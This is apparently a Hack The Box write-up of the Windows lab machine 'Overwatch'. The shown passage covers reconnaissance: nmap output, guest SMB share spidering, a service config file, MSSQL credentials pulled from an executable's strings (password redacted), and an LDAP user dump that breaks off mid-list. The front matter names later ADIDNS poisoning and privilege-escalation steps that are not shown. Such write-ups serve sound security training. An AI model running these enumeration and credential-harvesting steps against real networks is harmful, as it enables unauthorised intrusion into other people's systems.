---
title: Overwatch
layout: post
released: 2026-01-25
creators: xct
pwned: true
tags:
  - boxes
  - os/windows
  - diff/medium
category:
  - HTB
description: Overwatch is a medium windows box which allows guests to access a software SMB share. Said share contains a binary that when deconstructed leaks `sqlsvc`'s credentials which are usable to connect to the domain. `sqlsvc` has DNS permissions as well as we can find a linked server on the MSSQL service. We can exploit ADIDNS poisoning to point the linked server to ourselves and connect to it providing us credentials for the `sqlmgmt` user. Lastly we exploit the web service being used by the binary we found earlier in the software shell to get `NT authority/system`
image: /assets/img/img_overwatch/overwatch.png
cssclasses:
  - custom_htb
---
![Overwatch Image](/assets/img/img_overwatch/overwatch.png)

# Enumeration
## Scans
As usual we start off with an `nmap` port scan
```
PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open     kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-24 23:32:23Z)
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds? syn-ack ttl 127
464/tcp   open     kpasswd5?     syn-ack ttl 127
593/tcp   open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped    syn-ack ttl 127
3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped    syn-ack ttl 127
3389/tcp  open     ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2026-01-24T23:33:56+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Issuer: commonName=S200401.overwatch.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-07T15:16:06
| Not valid after:  2026-06-08T15:16:06
| MD5:     0da8 f9a5 d788 e363 07b1 5f70 6524 ffcb
| SHA-1:   3287 c62d 4408 7fbb 4038 00b3 32fa da67 fb22 14bc
| SHA-256: b8ca 73a4 d338 1c57 3558 eec9 d8d1 9381 5b2d e30e 7945 ff69 0565 8935 84da f28a
| -----BEGIN CERTIFICATE-----
| MIIC7jCCAdagAwIBAgIQQB+9JS5+iIRHlnVDL5wRazANBgkqhkiG9w0BAQsFADAg
| MR4wHAYDVQQDExVTMjAwNDAxLm92ZXJ3YXRjaC5odGIwHhcNMjUxMjA3MTUxNjA2
| WhcNMjYwNjA4MTUxNjA2WjAgMR4wHAYDVQQDExVTMjAwNDAxLm92ZXJ3YXRjaC5o
| dGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDmHUjAEelxLdt0uNeO
| ah2/XpNZQsIekINBswk9QIsJPsCdFScs60OIcc+kq9JyruEYQ44SGcnAMdRM1Aal
| mhhyLcJ0BX1pqcFQASSHbClRBwzW8O+7cZaWrVRV8l616Q9dOBVqtMMe7gK/qfOF
| mdE21VNURJ4LcDQ2BUBBjy0MKcCEEImly3cCyKyS7gCHi5VZ6GlShWykPSDq75Ob
| eM3S3zrbxogClJDUmfvay9vCRVyn33DW3Bf35dno2aEaYHzg9JMboey/XfgCNxQE
| wx7/GVjFxMo4CV3uZuDEPwaKH9S89Ta56Fgg3GcRCXrFqdhTN5Y+OJ2Ej/C4Jg0F
| j2wRAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDAN
| BgkqhkiG9w0BAQsFAAOCAQEAeR1mQymcP9NndxSFRjKvk+J9t0peN+caudPqj0nU
| MrlmzV05FyNCo3AiaoLRPBg6f29dqps/H2aJPzA8E3thAdNEgnAisbDWve6Ze1Pc
| XD0iUbe/KCIhqeRTpcD57UPjBb45lTcocPDLXlz5X4iFUhEiWqJXwkCnyNM+bgZl
| uPzaH52mU+sBikSLQfAppkg5MwRA+sCK8QhivS7BcwkolFrciEpWmlr0bHS0lCiR
| xlt1TwWNi2qGwnTfrO1Kag1P/Ky10JP3+X1r/KXb+71R3KwxCW/Bs9w6ZkCcwOLp
| 1lI8KPv4qke+B5jnwoDg+7x+0kZL3G2IT4atv6rCfYHooA==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-24T23:33:17+00:00
5985/tcp  open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6520/tcp  open     ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.12.9:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-01-24T23:33:57+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-22T14:19:13
| Not valid after:  2056-01-22T14:19:13
| MD5:     29ba 6179 b513 7bc7 787e f525 4283 b059
| SHA-1:   272d ea7f e924 dfe1 8ed6 5a23 bcec 2840 e913 8bb3
| SHA-256: 949d 1867 5f01 7111 8498 daae 9a02 a300 c955 9f77 a8ee 2d09 a2b1 d83b c85c c7a9
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQXxB9EYriP7xJOFzcIJ/ijzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwMTIyMTQxOTEzWhgPMjA1NjAxMjIxNDE5MTNaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAJirNEEv
| AqjJf6ythlh/xrVfgpd1wr5E3GBMYkVrTkf6U8sru6bHoMBMMY7G1hFaZNRspgvj
| EFYFb7gIiNgMkiKId898PmuHHLjS5ESiwSf2lmQzmO4C9XsOevFR3/Pko1VIwevq
| AU+hnr9nXQVVA1VC2IfRsezECZMG1Qv0QOU5MPLfize8yCkHT+Yhsy+1rdgA5tGL
| 4q/A/W20+rSBjzuegmjVmZaHkSQqyzz+tWjAiSnnVey6Fsefx1zRIQs0LA1waoXi
| kk01N2SZXkkmgjg0UZCem+oxwMlqDZAC4ctsCeV9RkG/5KoVM23ZLKAXulvp0Fi6
| k4WwFGlJPyEkSw8TJ1XlcZ1Sah4dFVVCXepf3bO4N7wCR+vxNy5NZFmfVM51gnJ/
| qr4nR6OHIzxvD8eBx1jkjLuTwvxGhI4j9v+VbP5A1l5GVuw74uvx+x+1xYdz2UdO
| 7vettpwZMdbftfHAlbyIY7VWkJ439XobM6Fg8+c6WxVbs1ZqrVMyD0IHFQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQCJBMi/4z71fKG1dgddZxRwG4aaaMcsBdx+8FN8
| +fYBHSrfDDJUwxFgz9ebkLxcgTGEORTjra3Kdgcseve5qpYGIPxpfh/eyQvcZnfj
| Ovd98cPlhn5GBwWlgghcTTMHR4Un6M2rWf1ndpVYUsOn7WmB4tdUjqLGRlruoXYB
| E9kCuDyxzWEWOcdJXAdDAQw0UWRJBPiCneoWSw07jLzNNCBKR/8RJiybp+6w2ebN
| AV1TKXhKUP2fRnnIkGl2A1rQRYl1XOgNQkDqutDhdjeJeazVJh7diUd2Zyb8PYnH
| wRTxB/ZxctOK03bLcuYfoQEiyN5VwCC8kKFIo8z9C7esJicxVnijK+tHpsUR2Vts
| v5J6G/KgjOIOHNMeSJ1AfoadCBOaj6xkq9bbS3kalMM92WDfLwj4m7HGgaBIggnf
| tQnx2tk4EHtuCtc8VQqwM0djpZjKJBH6f6xARaesQleykbV5Asw2LVKAEMETqgXm
| 4An+1cFN4Oxdbm0Fx/rcV3ctNKA=
|_-----END CERTIFICATE-----
| ms-sql-info: 
|   10.129.12.9:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
9389/tcp  open     mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
51076/tcp filtered unknown       no-response
56723/tcp open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
56724/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
58388/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
61265/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-24T23:33:17
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64805/tcp): CLEAN (Timeout)
|   Check 2 (port 60921/tcp): CLEAN (Timeout)
|   Check 3 (port 55821/udp): CLEAN (Timeout)
|   Check 4 (port 43829/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -2s, deviation: 0s, median: -3s
```

Looking at the ports we have the usual `AD DC suite` from a `Windows` machine. Here's some important information to take note of:

- FQDN: `overwatch.htb`
- NBDN: `OVERWATCH`
- DC Host: `S200401`
- OS build: `10.0.20348`

Interesting ports open:
- `6520 - MSSQL` | unusual port number for `MSSQL`
- `53 - DNS` | This usually isn't exposed on an `AD` machine.
- `3389 - RDP` | Usually we only get `WinRM` but in this instance it seems we might have to `RDP` into the machine.

# User
## SQL Credentials in SMB Share executable
Looking around we can find a couple shares we can read anonymously.
```bash
$ nxc smb overwatch.htb -u 'Guest' -p '' --shares
SMB         10.129.12.9     445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.9     445    S200401          [+] overwatch.htb\Guest: 
SMB         10.129.12.9     445    S200401          [*] Enumerated shares
SMB         10.129.12.9     445    S200401          Share           Permissions     Remark
SMB         10.129.12.9     445    S200401          -----           -----------     ------
SMB         10.129.12.9     445    S200401          ADMIN$                          Remote Admin
SMB         10.129.12.9     445    S200401          C$                              Default share
SMB         10.129.12.9     445    S200401          IPC$            READ            Remote IPC
SMB         10.129.12.9     445    S200401          NETLOGON                        Logon server share 
SMB         10.129.12.9     445    S200401          software$       READ            
SMB         10.129.12.9     445    S200401          SYSVOL                          Logon server share 
```

Let's start spidering through the shares that we can access using `nxc's spider_plus` module.
```bash
$ nxc smb overwatch.htb -u 'Guest' -p '' -M spider_plus
SMB         10.129.12.9     445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.9     445    S200401          [+] overwatch.htb\Guest: 
SPIDER_PLUS 10.129.12.9     445    S200401          [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.12.9     445    S200401          [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.12.9     445    S200401          [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.12.9     445    S200401          [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.12.9     445    S200401          [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.12.9     445    S200401          [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.12.9     445    S200401          [*]  OUTPUT_FOLDER: /home/kasm-user/.nxc/modules/nxc_spider_plus
SMB         10.129.12.9     445    S200401          [*] Enumerated shares
SMB         10.129.12.9     445    S200401          Share           Permissions     Remark
SMB         10.129.12.9     445    S200401          -----           -----------     ------
SMB         10.129.12.9     445    S200401          ADMIN$                          Remote Admin
SMB         10.129.12.9     445    S200401          C$                              Default share
SMB         10.129.12.9     445    S200401          IPC$            READ            Remote IPC
SMB         10.129.12.9     445    S200401          NETLOGON                        Logon server share 
SMB         10.129.12.9     445    S200401          software$       READ            
SMB         10.129.12.9     445    S200401          SYSVOL                          Logon server share 
SPIDER_PLUS 10.129.12.9     445    S200401          [+] Saved share-file metadata to "/home/kasm-user/.nxc/modules/nxc_spider_plus/10.129.12.9.json".
SPIDER_PLUS 10.129.12.9     445    S200401          [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, software$, SYSVOL)
SPIDER_PLUS 10.129.12.9     445    S200401          [*] SMB Readable Shares:  2 (IPC$, software$)
SPIDER_PLUS 10.129.12.9     445    S200401          [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.12.9     445    S200401          [*] Total folders found:  3
SPIDER_PLUS 10.129.12.9     445    S200401          [*] Total files found:    16
SPIDER_PLUS 10.129.12.9     445    S200401          [*] File size average:    1.36 MB
SPIDER_PLUS 10.129.12.9     445    S200401          [*] File size min:        2.11 KB
SPIDER_PLUS 10.129.12.9     445    S200401          [*] File size max:        6.81 MB
```

Let's take a look at the contents of the `Share-file metadata json` file.
```json
{
    "software$": {
        "Monitoring/EntityFramework.SqlServer.dll": {
            "atime_epoch": "2020-04-16 20:38:55",
            "ctime_epoch": "2020-04-16 20:38:55",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "577.88 KB"
        },
        "Monitoring/EntityFramework.SqlServer.xml": {
            "atime_epoch": "2020-04-16 20:38:55",
            "ctime_epoch": "2020-04-16 20:38:55",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "159.37 KB"
        },
        "Monitoring/EntityFramework.dll": {
            "atime_epoch": "2020-04-16 20:38:41",
            "ctime_epoch": "2020-04-16 20:38:41",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "4.76 MB"
        },
        "Monitoring/EntityFramework.xml": {
            "atime_epoch": "2020-04-16 20:38:39",
            "ctime_epoch": "2020-04-16 20:38:39",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "3.57 MB"
        },
        "Monitoring/Microsoft.Management.Infrastructure.dll": {
            "atime_epoch": "2017-07-17 14:46:09",
            "ctime_epoch": "2017-07-17 14:46:09",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "36 KB"
        },
        "Monitoring/System.Data.SQLite.EF6.dll": {
            "atime_epoch": "2024-09-29 20:40:05",
            "ctime_epoch": "2024-09-29 20:40:05",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "201.68 KB"
        },
        "Monitoring/System.Data.SQLite.Linq.dll": {
            "atime_epoch": "2024-09-29 20:40:41",
            "ctime_epoch": "2024-09-29 20:40:41",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "201.68 KB"
        },
        "Monitoring/System.Data.SQLite.dll": {
            "atime_epoch": "2024-09-29 20:41:17",
            "ctime_epoch": "2024-09-29 20:41:17",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "439.68 KB"
        },
        "Monitoring/System.Data.SQLite.xml": {
            "atime_epoch": "2024-09-28 18:47:59",
            "ctime_epoch": "2024-09-28 18:47:59",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "1.19 MB"
        },
        "Monitoring/System.Management.Automation.dll": {
            "atime_epoch": "2017-07-17 14:46:09",
            "ctime_epoch": "2017-07-17 14:46:09",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "352 KB"
        },
        "Monitoring/System.Management.Automation.xml": {
            "atime_epoch": "2017-07-17 14:46:09",
            "ctime_epoch": "2017-07-17 14:46:09",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "6.81 MB"
        },
        "Monitoring/overwatch.exe": {
            "atime_epoch": "2025-05-17 01:19:23",
            "ctime_epoch": "2025-05-17 01:19:23",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "9.5 KB"
        },
        "Monitoring/overwatch.exe.config": {
            "atime_epoch": "2025-05-17 01:02:29",
            "ctime_epoch": "2025-05-17 01:02:29",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "2.11 KB"
        },
        "Monitoring/overwatch.pdb": {
            "atime_epoch": "2025-05-17 01:19:23",
            "ctime_epoch": "2025-05-17 01:19:23",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "29.5 KB"
        },
        "Monitoring/x64/SQLite.Interop.dll": {
            "atime_epoch": "2024-09-28 19:18:19",
            "ctime_epoch": "2024-09-28 19:18:19",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "1.91 MB"
        },
        "Monitoring/x86/SQLite.Interop.dll": {
            "atime_epoch": "2024-09-28 19:17:43",
            "ctime_epoch": "2024-09-28 19:17:43",
            "mtime_epoch": "2026-01-06 11:25:34",
            "size": "1.52 MB"
        }
    }
}
```

Grabbing the config and taking a look we can find an endpoint on port `8000` that we cannot reach.
```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <configSections>
    <!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 -->
    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
  </configSections>
  <system.serviceModel>
    <services>
      <service name="MonitoringService">
        <host>
          <baseAddresses>
            <add baseAddress="http://overwatch.htb:8000/MonitorService" />
          </baseAddresses>
        </host>
        <endpoint address="" binding="basicHttpBinding" contract="IMonitoringService" />
        <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
      </service>
    </services>
    <behaviors>
      <serviceBehaviors>
        <behavior>
          <serviceMetadata httpGetEnabled="True" />
          <serviceDebug includeExceptionDetailInFaults="True" />
        </behavior>
      </serviceBehaviors>
    </behaviors>
  </system.serviceModel>
  <entityFramework>
    <providers>
      <provider invariantName="System.Data.SqlClient" type="System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer" />
      <provider invariantName="System.Data.SQLite.EF6" type="System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6" />
    </providers>
  </entityFramework>
  <system.data>
    <DbProviderFactories>
      <remove invariant="System.Data.SQLite.EF6" />
      <add name="SQLite Data Provider (Entity Framework 6)" invariant="System.Data.SQLite.EF6" description=".NET Framework Data Provider for SQLite (Entity Framework 6)" type="System.Data.SQLite.EF6.SQLiteProviderFactory, System.Data.SQLite.EF6" />
    <remove invariant="System.Data.SQLite" /><add name="SQLite Data Provider" invariant="System.Data.SQLite" description=".NET Framework Data Provider for SQLite" type="System.Data.SQLite.SQLiteFactory, System.Data.SQLite" /></DbProviderFactories>
  </system.data>
</configuration>
```

Downloading the `overwatch.exe` binary and taking a look at the `strings` we can find a string to connect to the database, including a username and a password.
```bash
$ strings -e l overwatch.exe                                           
'<Oe
Already monitoring.
Monitoring started.
Monitoring not active.
Monitoring stopped.
SessionSwitch
Reason: 
SELECT * FROM Win32_ProcessStartTrace
INSERT INTO EventLog (Timestamp, EventType, Details) VALUES (GETDATE(), '
', '
Stop-Process -Name 
 -Force
Out-String
Error: 
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=[REDACTED];
ProcessName
ProcessStart
Process: 
Service is running...
Press Enter to exit...
Microsoft\Edge\User Data\Default\History
Data Source=
;Version=3;
SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5
INSERT INTO EventLog (Timestamp, EventType, Details) VALUES (GETDATE(), 'URLVisit', '
VS_VERSION_INFO
VarFileInfo
Translation
StringFileInfo
000004b0
Comments
CompanyName
FileDescription
overwatch
FileVersion
1.0.0.0
InternalName
overwatch.exe
LegalCopyright
Copyright 
  2025
LegalTrademarks
OriginalFilename
overwatch.exe
ProductName
overwatch
ProductVersion
1.0.0.0
Assembly Version
1.0.0.0
```

Our attempt to connect to the `mssql` service on `port 6520` using the credentials we found is successful!
```bash
$ nxc mssql overwatch.htb --port 6520 -u 'sqlsvc' -p "$PASS"             
MSSQL       10.129.12.9     6520   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (EncryptionReq:False)
MSSQL       10.129.12.9     6520   S200401          [+] overwatch.htb\sqlsvc:[REDACTED]
```

## ADIDNS Poisoning + Linked SQL Server
Our credentials also work for `ldap`, let's grab a list of `users` using `--users-export`
```bash
$ nxc ldap overwatch.htb -u 'sqlsvc' -p "$PASS" --users-export users.txt 
LDAP        10.129.12.9     389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.12.9     389    S200401          [+] overwatch.htb\sqlsvc:[REDACTED] 
LDAP        10.129.12.9     389    S200401          [*] Enumerated 105 domain users: overwatch.htb
LDAP        10.129.12.9     389    S200401          -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.12.9     389    S200401          Administrator                 2025-05-17 03:09:35 0        Built-in account for administering the computer/domain      
LDAP        10.129.12.9     389    S200401          Guest                         2025-05-17 04:34:27 0        Built-in account for guest access to the computer/domain    
LDAP        10.129.12.9     389    S200401          krbtgt                        2025-05-17 00:08:45 0        Key Distribution Center Service Account                     
LDAP        10.129.12.9     389    S200401          sqlsvc                        2025-05-17 00:47:43 0                                                                    
LDAP        10.129.12.9     389    S200401          sqlmgmt                       2025-05-17 01:24:21 0                                                                    
LDAP        10.129.12.9     389    S200401          Charlie.Moss                  2025-05-17 03:05:41 0                                                                    
LDAP        10.129.12.9     389    S200401          Tracy.Burns                   2025-05-17 03:05:41 0                                                                    
LDAP        10.129.12.9     389    S200401          Kathryn.Bryan                 2025-05-17 03:05:41 0                                                                    
LDAP        10.129.12.9     389    S200401          Rachael.Thomas                2025-05-17 03:05:41 0                                                                    
LDAP        10.129.12.9     389    S200401          Aimee.Smith                   2025-05-17 03:05:41 0                                                                    
LDAP        10.129.12.9     389    S200401          Duncan.Freeman                2025-05-17 03:05:41 0                                                                    
LDAP        10.129.12.9     389    S200401          John.Begum                    2025-05-17 03:05:42 0                                                                    
LDAP        10.129.12.9     389    S200401          Bernard.Hilton                2025-05-17 03:05:42 0                                                                    
LDAP        10.129.12.9     389    S200401          Kim.Hargreaves                2025-05-17 03:05:42 0                                                                    
LDAP        10.129.12.9     389    S200401          Douglas.Burrows               2025-05-17 03:05:42 0                                                                    
LDAP        10.129.12.9     389    S200401          Carole.Murray                 2025-05-17 03:05:42 0                                                                    
LDAP        10.129.12.9     389    S200401          Olivia.Quinn                  2025-05-17 03:05:42 0                                                                    
LDAP        10.129.12.9     389    S200401          Trevor.Baker                  2025-05-17 03:05:42 0                                                                    
LDAP        10.129.12.9     389    S200401          Kenneth.Dennis                2025-05-17 03:05:42 0                                                                    
LDAP        10.129.12.9     389    S200401          Jeremy.Marshall               2025-05-17 03:05:43 0                                                                    
LDAP        10.129.12.9     389    S200401          Jodie.Jones                   2025-05-17 03:05:43 0                                                                    
LDAP        10.129.12.9     389    S200401          Thomas.Lee                    2025-05-17 03:05:43 0                                                                    
LDAP        10.129.12.9     389    S200401          Terence.Matthews              2025-05-17 03:05:43 0                                                                    
LDAP        10.129.12.9     389    S200401          Colin.Roberts                 2025-05-17 03:05:43 0                                                                    
LDAP        10.129.12.9     389    S200401          Aaron.Robinson                2025-05-17 03:05:43 0                                                                    
LDAP        10.129.12.9     389    S200401          Amanda.Jenkins                2025-05-17 03:05:44 0                                                                    
LDAP        10.129.12.9     389    S200401          Debra.Arnold                  2025-05-17 03:05:44 0                                                                    
LDAP        10.129.12.9     389    S200401          Michelle.Willis               2025-05-17 03:05:44 0                                                                    
LDAP        10.129.12.9     389    S200401          Kayleigh.Jones                2025-05-17 03:05:44 0                                                                    
LDAP        10.129.12.9     389    S200401          Adam.Russell                  2025-05-17 03:05:44 0                                                                    
LDAP        10.129.12.9     389    S200401          Tracey.Kelly                  2025-05-17 03:05:44 0                                                                    
LDAP        10.129.12.9     389    S200401          Bethan.Dale                   2025-05-17 03:05:44 0                                                                    
LDAP        10.129.12.9     389    S200401          Mandy.Wood                    2025-05-17 03:05:44 0                                                                    
LDAP        10.129.12.9     389    S200401          Jenna.Phillips                2025-05-17 03:05:45 0                                                                    
LDAP        10.129.12.9     389    S200401          Carole.Yates                  2025-05-17 03:05:45 0                                                                    
LDAP        10.129.12.9     389    S200401          Graham.Perry                  2025-05-17 03:05:45 0                                                                    
LDAP        10.129.12.9     389    S200401          Catherine.Griffiths           2025-05-17 03:05:45 0                                                                    
LDAP        10.129.12.9     389    S200401          Shaun.Jackson                 2025-05-17 03:05:45 0                                                                    
LDAP        10.129.12.9     389    S200401          Bethan.Rogers                 2025-05-17 03:05:45 0                                                                    
LDAP        10.129.12.9     389    S200401          Ellie.Singh                   2025-05-17 03:05:45 0                                                                    
LDAP        10.129.12.9     389    S200401          Marie.Allan                   2025-05-17 03:05:46 0                                                                    
LDAP        10.129.12.9     389    S200401          Patrick.Holmes                2025-05-17 03:05:46 0                                                                    
LDAP        10.129.12.9     389    S200401          Victor.Hopkins                2025-05-17 03:05:46 0                                                                    
LDAP        10.129.12.9     389    S200401          Geraldine.Harper              2025-05-17 03:05:46 0                                                                    
LDAP        10.129.12.9     389    S200401          George.Todd                   2025-05-17 03:05:46 0                                                                    
LDAP        10.129.12.9     389    S200401          Karl.Smith                    2025-05-17 03:05:46 0                                                                    
LDAP        10.129.12.9     389    S200401          Jacqueline.Norton             2025-05-17 03:05:46 0                                                                    
LDAP        10.129.12.9     389    S200401          Frederick.Murray              2025-05-17 03:05:46 0                                                                    
LDAP        10.129.12.9     389    S200401          Joe.Pearce                    2025-05-17 03:05:47 0                                                                    
LDAP        10.129.12.9     389    S200401          Paul.Collins                  2025-05-17 03:05:47 0                                                                    
LDAP        10.129.12.9     389    S200401          Damien.Edwards                2025-05-17 03:05:47 0                                                                    
LDAP        10.129.12.9     389    S200401          Eileen.Phillips               2025-05-17 03:05:47 0                                                                    
LDAP        10.129.12.9     389    S200401          Carl.Johnson                  2025-05-17 03:05:47 0                                                                    
LDAP        10.129.12.9     389    S200401          Kevin.Newton                  2025-05-17 03:05:47 0                                                                    
LDAP        10.129.12.9     389    S200401          Natalie.Higgins               2025-05-17 03:05:47 0                                                                    
LDAP        10.129.12.9     389    S200401          Francis.Weston                2025-05-17 03:05:48 0                                                                    
LDAP        10.129.12.9     389    S200401          Benjamin.Davison              2025-05-17 03:05:48 0                                                                    
LDAP        10.129.12.9     389    S200401          Martin.Kemp                   2025-05-17 03:05:48 0                                                                    
LDAP        10.129.12.9     389    S200401          Angela.Jones                  2025-05-17 03:05:48 0                                                                    
LDAP        10.129.12.9     389    S200401          Gareth.Ahmed                  2025-05-17 03:05:48 0                                                                    
LDAP        10.129.12.9     389    S200401          Deborah.Morgan                2025-05-17 03:05:48 0                                                                    
LDAP        10.129.12.9     389    S200401          Grace.Taylor                  2025-05-17 03:05:48 0                                                                    
LDAP        10.129.12.9     389    S200401          Roger.Hughes                  2025-05-17 03:05:48 0                                                                    
LDAP        10.129.12.9     389    S200401          Albert.Barrett                2025-05-17 03:05:49 0                                                                    
LDAP        10.129.12.9     389    S200401          Grace.Curtis                  2025-05-17 03:05:49 0                                                                    
LDAP        10.129.12.9     389    S200401          Marilyn.Griffiths             2025-05-17 03:05:49 0                                                                    
LDAP        10.129.12.9     389    S200401          Tracey.Barker                 2025-05-17 03:05:49 0                                                                    
LDAP        10.129.12.9     389    S200401          Suzanne.Hughes                2025-05-17 03:05:49 0                                                                    
LDAP        10.129.12.9     389    S200401          Timothy.Jackson               2025-05-17 03:05:49 0                                                                    
LDAP        10.129.12.9     389    S200401          Beverley.Thompson             2025-05-17 03:05:49 0                                                                    
LDAP        10.129.12.9     389    S200401          Clare.Bartlett                2025-05-17 03:05:50 0                                                                    
LDAP        10.129.12.9     389    S200401          Irene.Johnson                 2025-05-17 03:05:50 0                                                                    
LDAP        10.129.12.9     389    S200401          Bernard.Wood                  2025-05-17 03:05:50 0                                                                    
LDAP        10.129.12.9     389    S200401          Frank.McCarthy                2025-05-17 03:05:50 0                                                                    
LDAP        10.129.12.9     389    S200401          Elaine.Page                   2025-05-17 03:05:50 0                                                                    
LDAP        10.129.12.9     389    S200401          Elaine.Walker                 2025-05-17 03:05:50 0                                                                    
LDAP        10.129.12.9     389    S200401          Mohammad.Hill                 2025-05-17 03:05:50 0                                                                    
LDAP        10.129.12.9     389    S200401          Glenn.Field                   2025-05-17 03:05:50 0                                                                    
LDAP        10.129.12.9     389    S200401          Deborah.Martin                2025-05-17 03:05:51 0                                                                    
LDAP        10.129.12.9     389    S200401          Gail.Sullivan                 2025-05-17 03:05:51 0                                                                    
LDAP        10.129.12.9     389    S200401          Maureen.Kirby                 2025-05-17 03:05:51 0                                                                    
